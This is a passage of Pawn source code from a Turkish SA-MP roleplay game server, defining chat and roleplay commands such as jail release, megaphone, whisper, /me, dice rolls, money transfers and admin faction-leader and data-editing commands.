		            Kullanim(playerid, "/hapiscikar [oyuncuID]");
		            return 1;
				}
				new id = strval(string);
				if(ProxDetectorS(5.0, playerid, id))
				{
			        Karakter[id][kodes] = 0;
			        SetPlayerPos(id, 1529.6,-1691.2,13.3);
					format(string, sizeof(string), "%s adlý oyuncuyu hapisten çýkardýnýz.", OyuncuAdiniBul(id));
					Bilgi(playerid, string);
					format(string, sizeof(string), "%s adlý oyuncu tarafýndan hapisten çýkartýldýnýz.", OyuncuAdiniBul(playerid));
					Bilgi(id, string);
				}
			}
		}
		return 1;
	}
	if(!strcmp(string, "/gozalticikar", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
	    {
         if(IsPlayerInRangeOfPoint(playerid, 30.0, Veriler[tiX], Veriler[tiY], Veriler[tiZ]))
	        {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/gozalticikar [oyuncuID]");
		            return 1;
				}
				new id = strval(string);
				if(ProxDetectorS(5.0, playerid, id))
				{
			        Karakter[id][kodes] = 0;
			        SetPlayerPos(id, -712.2310,-2961.6714,1197.7346);
					format(string, sizeof(string), "%s adlý oyuncuyu gözaltýndan çýkardýnýz.", OyuncuAdiniBul(id));
					Bilgi(playerid, string);
					format(string, sizeof(string), "%s adlý oyuncu tarafýndan gözaltýndan çýkartýldýnýz.", OyuncuAdiniBul(playerid));
					Bilgi(id, string);
				}
			}
		}
		return 1;
	}
	if(!strcmp(string, "/pdfener", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
			if(!IsPlayerInAnyVehicle(playerid))
			{
				if(flashlight[playerid]==0)
	            {
	            	SetPlayerAttachedObject(playerid, 9,18656, 5, 0.1, 0.038, -0.1, -90, 180, 0, 0.03, 0.03, 0.03);
	                SetPlayerAttachedObject(playerid, 8,18641, 5, 0.1, 0.02, -0.05, 0, 0, 0, 1, 1, 1);
	                flashlight[playerid]=1;
	                return 1;
				}
	   			else if(flashlight[playerid]==1)
	            {
	                SetPlayerAttachedObject(playerid, 9,18656, 5, 0.1, 0.038, -0.01, -90, 180, 0, 0.03, 0.1, 0.03);
	                SetPlayerAttachedObject(playerid, 8,18641, 5, 0.1, 0.02, -0.05, 0, 0, 0, 1, 1, 1);
	                flashlight[playerid]=2;
	                return 1;
	            }
	            else if(flashlight[playerid]==2)
	            {
	                RemovePlayerAttachedObject(playerid,9);
	                RemovePlayerAttachedObject(playerid,8);
	                flashlight[playerid]=0;
	                return 1;
	            }
			}
		}
		return 1;
	}
	if(!strcmp(string, "/m1", true))
	{
	    if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý deðilsiniz.");
		OnPlayerCommandPerformed(playerid, "/m LSPD! Aracýnýzý sað þeride park edin ve motorunu durdurun!", 0);
	    return 1;
	}
	if(!strcmp(string, "/arananlar", true))
	{
	    if(!Girdi[playerid] || (Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != FBI)) return 1;
		if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
		ShowPlayerDialog(playerid, 396, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"LSPD - MDC", "Aranma Kayýtlarýna Göz At\nAranma Kayýtý Ekle", "Seç", "Ýptal");
	    return 1;
	}
	if(strcmp(string, "/megafon", true) == 0 || strcmp(string, "/m", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				Kullanim(playerid, "(/m)egafon [megafon duyurusu]");
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || (Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1) || Birlik[Karakter[playerid][birlik]][ftip] == FBI || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
			{
				format(string, sizeof(string), "[MEGAFON]%s: %s", OyuncuAdiniBul(playerid), result);
				ProxDetector(60.0, playerid, string,COLOR_YELLOWG,COLOR_YELLOWG,COLOR_YELLOWG,COLOR_YELLOWG,COLOR_YELLOWG);
			}
			else
			{
			    Hata(playerid, "FBI, LSPD, LSPA, LSFD veya ASMS görevlisi deðilsiniz.");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(string, "/mikrofon", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				Kullanim(playerid, "/mikrofon [yazi]");
				return 1;
			}
			if(mik[playerid] == 1)
			{
				format(string, sizeof(string), "[MÝKROFON]%s: %s", OyuncuAdiniBul(playerid), result);
				ProxDetector(60.0, playerid, string,COLOR_YELLOWG,COLOR_YELLOWG,COLOR_YELLOWG,COLOR_YELLOWG,COLOR_YELLOWG);
			}
			else
			{
			    Hata(playerid, "Mikrofonu kullanma yetkiniz yok.");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(string,"/makeleader",true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
	    	string = strtok(cmdtext,idx);
	    	if(!strlen(string))
	    	{
	    	    Kullanim(playerid,"/makeleader [id] [birlik id]");
	    	    return 1;
	    	}
	    	new id = strval(string);
			if(Girdi[id] == true || id != 9999)
			{
			    string = strtok(cmdtext,idx);
		    	if(!strlen(string))
		    	{
		    	    Kullanim(playerid,"/makeleader [id] [birlik id]");
		    	    return 1;
		    	}
		    	new _oid = strval(string);
		    	if(_oid == 4 && Karakter[playerid][sqlid] != 100) return 1;
			    Karakter[id][birlik] = _oid;
			    Karakter[id][rutbe] = 1;
				if(_oid != 0) Birlik[_oid][blider] = Karakter[id][sqlid];
			    KarakterKaydet(id);
			    new yazi[256];
			    format(yazi,sizeof(yazi),"%s adlý oyuncuyu %s oluþumunun lideri yaptýnýz.",OyuncuAdiniBul(id),Birlik[_oid][fisim]);
			    Bilgi(playerid, yazi);
			    format(yazi, sizeof(yazi), "[MAKELEADER]%s'i %s oluþumunun lideri yapti", OyuncuAdiniBul(id), Birlik[_oid][fisim]);
			    Log(playerid, yazi);
			    format(yazi, sizeof(yazi), "[MAKELEADER]%s, %s oluþumunun lideri yapti", OyuncuAdiniBul(playerid), Birlik[_oid][fisim]);
  	    		Log(id, yazi);
				if(_oid == 0)
				{
				    Karakter[id][birlik] = 0;
				    Karakter[id][rutbe] = 0;
				    KarakterKaydet(id);
				    return 1;
				}
			}
			else
			{
			    Hata(playerid, "Hatalý ID.");
			    return 1;
			}
	    }
	    return 1;
	}

	if(strcmp(string, "/vw", true) == 0 || strcmp(string, "/virtualw", true) == 0)
	{
	    format(string, sizeof(string), "Virtualworld: %d", GetPlayerVirtualWorld(playerid));
	    SendClientMessage(playerid, COLOR_GREY, string);
	    return 1;
	}
	if(strcmp(string, "/ozellik", true) == 0)
	{
		string = strtok(cmdtext, idx);
		if(!strlen(string)) return Kullanim(playerid, "/ozellik [playerid/isim]");
		new giveplayerid = ReturnUser(string);
		if(ProxDetectorS(4.5, playerid, giveplayerid) && giveplayerid != playerid)
		{
			if(IsPlayerConnected(giveplayerid) && Girdi[giveplayerid])
			{
			    if(gSpectateType[giveplayerid] != ADMIN_SPEC_TYPE_NONE) return Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
			    new mstring[128];
			    format(mstring, sizeof(mstring), "/ame gözleriyle %s isimli kiþiyi baþtan aþaðýya süzer.",OyuncuAdiniBul(giveplayerid));
			    OnPlayerCommandPerformed(playerid,mstring,0);
				DurumuGoster(playerid, giveplayerid);
				return 1;
			}
		}
		else return Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
		return 1;
	}
	if(strcmp(string, "/durum", true) == 0)
	{
	    DurumuGoster(playerid, playerid);
	    return 1;
	}

	if(strcmp(string, "/b", true) == 0)
	{
	    if(gTvIzliyo[playerid]) return 1;
		new slength = strlen(cmdtext);
		while ((idx < slength) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new soffset = idx;
		new sresult[128];
		while ((idx < slength) && ((idx - soffset) < (sizeof(sresult) - 1)))
		{
			sresult[idx - soffset] = cmdtext[idx];
			idx++;
		}
		sresult[idx - soffset] = EOS;
		if(!strlen(sresult))
		{
			Kullanim(playerid, "/b [rol dýþý konuþma]");
			return 1;
		}
		format(string, sizeof(string), "[OOC] %s: %s", OyuncuAdiniBul(playerid), sresult);
		Log(playerid, string);
		if(strlen(sresult) > 80)
		{
			new txxt[3][128];
			TextBol(sresult,txxt,60);
			format(string, sizeof(string), "[OOC] %s: (( %s ...", OyuncuAdiniBul(playerid), txxt[0]);
			if(Karakter[playerid][adminlevel] > 0 && Karakter[playerid][adminlevel] < 7) format(string, sizeof(string), "[OOC] "C4"%s: {E6E6E6}(( %s ...", OyuncuAdiniBul(playerid), txxt[0]);
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			format(string, sizeof(string), " ... %s ))",txxt[1]);
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		}
		else
		{
			format(string, sizeof(string), "[OOC] %s: (( %s ))", OyuncuAdiniBul(playerid), sresult);
			if(Karakter[playerid][adminlevel] > 0 && Karakter[playerid][adminlevel] < 7) format(string, sizeof(string), "[OOC] "C4"%s: {E6E6E6}(( %s ))", OyuncuAdiniBul(playerid), sresult);
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		}
		return 1;
	}
	if(strcmp(string, "/do", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(gTvIzliyo[playerid]) return 1;
			new sslength = strlen(cmdtext);
			while ((idx < sslength) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new ssoffset = idx;
			new ssresult[128];
			while ((idx < sslength) && ((idx - ssoffset) < (sizeof(ssresult) - 1)))
			{
				ssresult[idx - ssoffset] = cmdtext[idx];
				idx++;
			}
			ssresult[idx - soffset] = EOS;
			if(!strlen(ssresult))
			{
				Kullanim(playerid, "/do [durum]");
				return 1;
			}
			if(strlen(ssresult) > 80){
				new txt[3][128];
				TextBol(ssresult,txt,78);
				format(string, sizeof(string), "%s ...", txt[0]);
				if(EvMesafesi(2.0, playerid) != 0 ) EvDo(playerid, txt[0]);
				if(IsyeriMesafesi(2.0, playerid) != 0) IsyeriDo(playerid, txt[0]);
				format(string, sizeof(string), "... %s", txt[1]);
				if(EvMesafesi(2.0, playerid) != 0 ) EvDo(playerid, txt[1]);
				if(IsyeriMesafesi(2.0, playerid) != 0) IsyeriDo(playerid, txt[1]);
				format(string, sizeof(string), "%s", sresult);
				DoGonderEx(playerid,30.0,string);
				format(string, sizeof(string), "[DO] * %s: %s", OyuncuAdiniBul(playerid),ssresult);
				Log(playerid, string);
			}
			else
			{
				format(string, sizeof(string), "%s", sresult);
				DoGonder(playerid, 20.0, string);
				if(EvMesafesi(2.0, playerid) != 0 ) EvDo(playerid, string);
				if(IsyeriMesafesi(2.0, playerid) != 0) IsyeriDo(playerid, string);
				format(string, sizeof(string), "[DO] * %s: %s", OyuncuAdiniBul(playerid),ssresult);
				Log(playerid, string);
			}
		}
		return 1;
	}
	if(strcmp(string, "/c", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(gTvIzliyo[playerid]) return 1;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				Kullanim(playerid, "/c [yazý]");
				return 1;
			}
			format(string, sizeof(string), "{E6E6E6}%s (sessizce): %s", OyuncuAdiniBul(playerid), result);
			ProxDetector(2.5, playerid, string,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4);
			KonusturMeyhaneci(playerid, strlen(result));
			format(string, sizeof(string), "%s(sessizce): %s", OyuncuAdiniBul(playerid),result);
			Log(playerid, string);
		}
		return 1;
	}
	if(strcmp(string, "/cw", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				Kullanim(playerid, "/cw [yazý]");
				return 1;
			}
			if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç içerisinde deðilsiniz.");
			format(string, sizeof(string), "{00ffff}[Araç Ýçi]%s: %s", OyuncuAdiniBul(playerid), result);
			new arac = GetPlayerVehicleID(playerid);
			if(IsAMotorBike(arac)) return Hata(playerid, "Bu araçta bu komutu kullanamazsýnýz.");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(GetPlayerVehicleID(i) == arac)
				{
				    SendClientMessage(i,COLOR_YELLOW,string);
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/w", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gTvIzliyo[playerid]) return 1;
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/(w)hisper [playerid] [fýsýlda]");
				return 1;
			}
			new giveplayerid;
			giveplayerid = ReturnUser(string);
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					new length = strlen(cmdtext);
					while ((idx < length) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offset = idx;
					new result[128];
					while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
					{
						result[idx - offset] = cmdtext[idx];
						idx++;
					}
					result[idx - offset] = EOS;
					if(!strlen(result))
					{
						Kullanim(playerid, "/(w)hisper [playerid] [fýsýlda]");
						return 1;
					}
					if (ProxDetectorS(3.0, playerid, giveplayerid))
					{
						if(giveplayerid != playerid)
						{
						    if(gSpectateType[giveplayerid] != ADMIN_SPEC_TYPE_NONE) return Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
						    new yazii[128];
							format(yazii, sizeof(yazii), "%s fýsýldar: %s", OyuncuAdiniBul(playerid), result);
							SendClientMessage(giveplayerid, COLOR_YELLOW, yazii);
							SendClientMessage(playerid, COLOR_YELLOW, yazii);
							format(string,sizeof(string),"* %s'e doðru yaklaþarak bir þeyler fýsýldar.",OyuncuAdiniBul(giveplayerid));
							SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
							format(string,sizeof(string),"(( %s'e doðru yaklaþarak bir þeyler fýsýldar. ))",OyuncuAdiniBul(giveplayerid));
							SendClientMessage(playerid,0xC2A2DAFF,string);
							format(string, sizeof(string), "[FISILDA]%s e: %s", OyuncuAdiniBul(giveplayerid), result);
							Log(playerid, string);
							format(string, sizeof(string), "[FISILDA]%s fýsýldar: %s", OyuncuAdiniBul(playerid), result);
							Log(giveplayerid, string);
						}
						else
						{
							Hata(playerid, "Kendinize fýsýldayamazsýnýz.");
						}

					}
					else
					{
						Hata(playerid,"Oyuncu yakýnýnýzda deðil.");
					}
					return 1;
				}
			}
			else
			{
   				new yaziii[128];
				format(yaziii, sizeof(yaziii), "ID %d oyunda deðil.", strval(string));
				Hata(playerid, yaziii);
			}
		}
		return 1;
	}
	if(strcmp(string, "/s", true) == 0 || strcmp(string, "/shout", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(gTvIzliyo[playerid]) return 1;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
			idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
			result[idx - offset] = cmdtext[idx];
			idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				Kullanim(playerid, "/s [yazý]");
				return 1;
			}
			format(string, sizeof(string), "%s(baðýrarak):{E6E6E6} %s!",OyuncuAdiniBul(playerid), result);
			ProxDetector(30.0, playerid, string,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);
			if(EvMesafesi(2.0, playerid) != 0 ) EvBagir(playerid, string);
			if(EvIcKapiYaninda(playerid) != 0 ) EvDisariBagir(playerid, string);
			if(IsyeriMesafesi(2.0, playerid) != 0) IsyeriBagir(playerid, string);
   			new log[256];
			format(log, sizeof(log), "%s(bagirarak): %s", OyuncuAdiniBul(playerid), result);
			Log(playerid, log);
		}
		return 1;
	}
 	if(strcmp(string, "/me", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gTvIzliyo[playerid]) return 1;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[256];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				Kullanim(playerid,"/me [eylem]");
				return 1;
			}

			new form[256];
			if(strlen(result) > 80)
			{
				format(form, sizeof(form), "%s",result);
				MeGonderEx(playerid,30.0,form);
		        new log[256];
				format(log, sizeof(log), "[ME] * %s: %s", OyuncuAdiniBul(playerid), form);
				Log(playerid, log);
			    return 1;
			}
			format(form, sizeof(form), "%s",result);
			MeGonder(playerid,30.0,form);
   			new log[256];
			format(log, sizeof(log), "[ME] * %s: %s", OyuncuAdiniBul(playerid), string);
			Log(playerid, log);
		}
		return 1;
	}
	if(strcmp(string, "/ame", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(gTvIzliyo[playerid]) return 1;
			new lengthqweasz = strlen(cmdtext);
			while ((idx < lengthqweasz) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetqweasz = idx;
			new resultqweasz[256];
			while ((idx < lengthqweasz) && ((idx - offsetqweasz) < (sizeof(resultqweasz) - 1)))
			{
				resultqweasz[idx - offsetqweasz] = cmdtext[idx];
				idx++;
			}
			resultqweasz[idx - offsetqweasz] = EOS;
			if(!strlen(resultqweasz))
			{
				Kullanim(playerid, "/ame [eylem]");
				return 1;
			}
			format(string, sizeof(string), "[AME] * %s %s", OyuncuAdiniBul(playerid),resultqweasz);
			Log(playerid, string);
			format(string,sizeof(string),"* %s",resultqweasz);
			SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
			format(string,sizeof(string),"(( %s %s ))",OyuncuAdiniBul(playerid),resultqweasz);
			SendClientMessage(playerid,0xC2A2DAFF,string);
   			new log[256];
			format(log, sizeof(log), "[AME] * %s: %s", OyuncuAdiniBul(playerid), resultqweasz);
			Log(playerid, log);
		}
		return 1;
	}
	/*if(strcmp(string, "/sme", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(gTvIzliyo[playerid]) return 1;
			new lengthqweasz = strlen(cmdtext);
			while ((idx < lengthqweasz) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetqweasz = idx;
			new resultqweasz[256], sure;
			while ((idx < lengthqweasz) && ((idx - offsetqweasz) < (sizeof(resultqweasz) - 1)))
			{
				resultqweasz[idx - offsetqweasz] = cmdtext[idx];
				idx++;
			}
			resultqweasz[idx - offsetqweasz] = EOS;
			if(!strlen(resultqweasz,sure))
			{
				Kullanim(playerid, "/ame [sure] [eylem]");
				return 1;
			}
			if(sure < 1 || sure > 300)
			{
			    Hata(playerid, "Süre en fazla 300 saniye olabilir.");
			    return 1;
			}
			format(string, sizeof(string), "[AME] * %s %s", OyuncuAdiniBul(playerid),resultqweasz);
			Log(playerid, string);
			format(string,sizeof(string),"* %s",resultqweasz);
			SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,sure*1000);
			format(string,sizeof(string),"(( %s %s ))",OyuncuAdiniBul(playerid),resultqweasz);
			SendClientMessage(playerid,0xC2A2DAFF,string);
   			new log[256];
			format(log, sizeof(log), "[AME] * %s: %s", OyuncuAdiniBul(playerid), resultqweasz);
			Log(playerid, log);
		}
		return 1;
	}*/
	if(!strcmp(string, "/zar", true))
	{
	    if(gTvIzliyo[playerid]) return 1;
	    new mesaj[128], sonuc;
	    sonuc = random(6);
		format(mesaj, sizeof(mesaj), "elindeki zarý yere doðru fýrlattý. (%d)",sonuc+1);
		ZarMesaj(playerid, 15.0, mesaj);
		return 1;
	}
	if(!strcmp(string, "/tkm", true))
	{
	    if(gTvIzliyo[playerid]) return 1;
	    new mesaj[128], sonuc, gsonuc[128];
	    sonuc = random(3);
        switch(sonuc)
	    {
	        case 0: gsonuc = "Taþ";
	        case 1: gsonuc = "Kaðýt";
	        case 2: gsonuc = "Makas";
		}
		format(mesaj, sizeof(mesaj), "Sað elini yumruk yaparak yukarý aþaðý sallar. (%s)",gsonuc);
		TkmMesaj(playerid, 15.0, mesaj);
		return 1;
	}
	if(!strcmp(string, "/zar2", true))
	{
	    if(gTvIzliyo[playerid]) return 1;
	    new mesaj[128], sonuc, sonuc2;
	    sonuc = random(6);
	    sonuc2 = random(6);
		format(mesaj, sizeof(mesaj), "Elindeki zarý yere doðru fýrlattý. (%d,%d)",sonuc+1,sonuc2+1);
		ZarMesaj(playerid, 15.0, mesaj);
		return 1;
	}
	if(!strcmp(string, "/zargizle", true))
	{
	    if(gTvIzliyo[playerid]) return 1;
	    string = strtok(cmdtext, idx);
		if(!strlen(string)) return Kullanim(playerid, "/zargizle [oyuncuID]");
		new _pid = strval(string);
		if(!Girdi[_pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðildir.");
	    new mesaj[128], sonuc;
	    sonuc = random(6);
		format(mesaj, sizeof(mesaj), "Elindeki zarý yere doðru fýrlattý. (%d)",sonuc+1);
		ZarMesajGizli(playerid, _pid, mesaj);
		return 1;
	}
	if(!strcmp(string, "/rulet", true))
	{
	    if(gTvIzliyo[playerid]) return 1;
	    new mesaj[128], sonuc;
	    sonuc = random(37);
		format(mesaj, sizeof(mesaj), "ruleti çevirmeye baþlar.");
		MeGonder(playerid, 15.0, mesaj);
		format(mesaj, sizeof(mesaj), "Gelen sayý: %d", sonuc);
		RuletMesaj(playerid, 15.0, mesaj);
		return 1;
	}
	if(!strcmp(string, "/yazitura", true))
	{
	    if(gTvIzliyo[playerid]) return 1;
	    new mesaj[128], sonuc, gsonuc[128];
	    sonuc = random(2);
	    switch(sonuc)
	    {
	        case 0: gsonuc = "Yazý";
	        case 1: gsonuc = "Tura";
		}
		format(mesaj, sizeof(mesaj), "elindeki parayý havaya doðru fýrlattý.");
		MeGonder(playerid, 15.0, mesaj);
		format(mesaj, sizeof(mesaj), "Gelen sonuç: %s", gsonuc);
		YaziTura(playerid, 15.0, mesaj);
		return 1;
	}
	if(strcmp(string, "/admins", true) == 0 || strcmp(string, "/yoneticiler", true) == 0)
	{
	    SendClientMessageEx(playerid, COLOR_GREY, ""C2"[AKTÝF YÖNETÝCÝLER"C1"(%d)"C2"]",YonetimSay());
	  	for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerConnected(i))
		    {
			    if(Karakter[i][adminlevel] >= 1 && Karakter[i][adminlevel] < 7)
			    {
			    	if(aDuty[i] == 1)
			    	{
						format(string, sizeof(string), "{FF4000}[!] {bfc0c2}%s - %s (%d) Durum: {33aa33}Müsait", SQLFromName(Karakter[i][sqlid]),Karakter[i][anick],i);
						SendClientMessage(playerid, -1, string);
					}
					else
					{
						format(string, sizeof(string), "{FF4000}[!] {bfc0c2}%s - %s (%d) Durum: {900000}Meþgul", SQLFromName(Karakter[i][sqlid]),Karakter[i][anick],i);
						SendClientMessage(playerid, -1, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/helpers", true) == 0 || strcmp(string, "/destekekibi", true) == 0)
	{
	    SendClientMessageEx(playerid, COLOR_GREY, ""C2"[AKTÝF HELPERLAR"C1"(%d)"C2"]",TesterSay());
	  	for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerConnected(i))
		    {
			    if(Karakter[i][tester] >= 1)
			    {
			        if(tDuty[i] == 1)
			    	{
						format(string, sizeof(string), "{FF4000}[!] {bfc0c2}%s - Nick: %s (%d)", OyuncuAdiniBul(i,1),Karakter[i][nick],i);
						SendClientMessage(playerid, -1, string);
					}
					else
					{
						format(string, sizeof(string), "{FF4000}[!] {bfc0c2}%s - Nick: %s (%d)", OyuncuAdiniBul(i,1),Karakter[i][nick],i);
						SendClientMessage(playerid, -1, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/paraver", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(Karakter[playerid][level] < 2) return Hata(playerid, "Para verebilmek için en az 2 seviye olmanýz gerekiyor.");
	        if(gTvIzliyo[playerid]) return 1;
			new giveplayerid;
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/paraver [oyuncuID/isim_soyisim] [miktar]");
				return 1;
			}
	        giveplayerid = ReturnUser(string);
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/paraver [oyuncuID/isim_soyisim] [miktar]");
				return 1;
			}
			new moneys,playermoney;
			moneys = strval(string);
			if(moneys < 1 || moneys > 99999)
			{
			    Hata(playerid, "Hatalý bir miktar girdiniz.");
			    return 1;
			}
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					if (ProxDetectorS(5.0, playerid, giveplayerid))
					{
					    if(giveplayerid != playerid)
					    {
							playermoney = GetPlayerCash(playerid);
							if (moneys > 0 && playermoney >= moneys)
							{
							    if(gSpectateType[giveplayerid] != ADMIN_SPEC_TYPE_NONE) return Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
	       						GivePlayerCash(playerid, (0 - moneys));
								GivePlayerCash(giveplayerid, moneys);
								new paraveremote[128];
								format(string, sizeof(string), "{B3B3B3}%s isimli oyuncuya %d$ verdiniz.", OyuncuAdiniBul(giveplayerid), moneys);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								SendClientMessage(playerid, -1, string);
								Log(playerid, string);
								format(string, sizeof(string), "{B3B3B3}%s(ID:%d) isimli oyuncudan %d$ aldýnýz.",OyuncuAdiniBul(playerid), playerid,moneys);
								SendClientMessage(giveplayerid, -1, string);
								Log(giveplayerid, string);
								format(string, sizeof(string), "%s adlý oyuncu %s adlý oyuncuya %d$ verdi.",OyuncuAdiniBul(playerid),OyuncuAdiniBul(giveplayerid),moneys);
								AdminGonder(string);
								PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
								format(paraveremote, sizeof(paraveremote), "cebinden bir miktar para çýkartýr ve %s'e uzatýr.", OyuncuAdiniBul(giveplayerid));
								MeGonder(playerid, 15.0, paraveremote);
							}
							else
							{
								Hata(playerid, "Geçersiz miktar girdiniz.");
							}
						}
      					else
						{
							Hata(playerid, "Kendinize para veremezsiniz.");
						}
					}
					else
					{
						Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
					}
				}
			}
			else
			{
				Hata(playerid, "Hatalý ID.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/veriduzenle", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))
		    {
			    SendClientMessage(playerid, BIZIMYESIL, "____________________VERÝ DÜZENLEME ÝÞLEMLERÝ____________________");
				SendClientMessage(playerid, COLOR_GREY, "/veriduzenle [islem]");
				SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: galeridurum, galeripos, tutukla, kodes, isbasi, sevkiyat, banka, ekipman, cctv");
                SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: balik, taksi, reklam, tezgah, pizza, ehliyet, aracsicil, otobus, paintball, aractahta");
				SendClientMessage(playerid, BIZIMYESIL, "____________________________________________________________");
			}
			else if(strcmp(string, "galeridurum", true) == 0)
			{
			    if(Veriler[gdurum] == 1)
			    {
			        Veriler[gdurum] = 0;
			        Bilgi(playerid, "Galeri aktif hale getirildi, araç satýn alýmlarý etkinleþtirildi.");
				    VerileriKaydet();
				}
				else
				{
				    Veriler[gdurum] = 1;
					Bilgi(playerid, "Galeri pasif hale getirildi, araç satýn alýmlarý deaktifleþtirildi.");
				    VerileriKaydet();
				}
			}
			else if(strcmp(string, "aractahta", true) == 0)
			{
				new Float:ekX, Float:ekY, Float:ekZ, Float:ekrZ;
				GetPlayerPos(playerid, ekX, ekY, ekZ);
				GetPlayerFacingAngle(playerid, ekrZ);
				GetXYInFrontOfPlayer(playerid, ekX, ekY, ekZ, 0.95);
				Veriler[aractahtayazix] = ekX;
				Veriler[aractahtayaziy] = ekY;
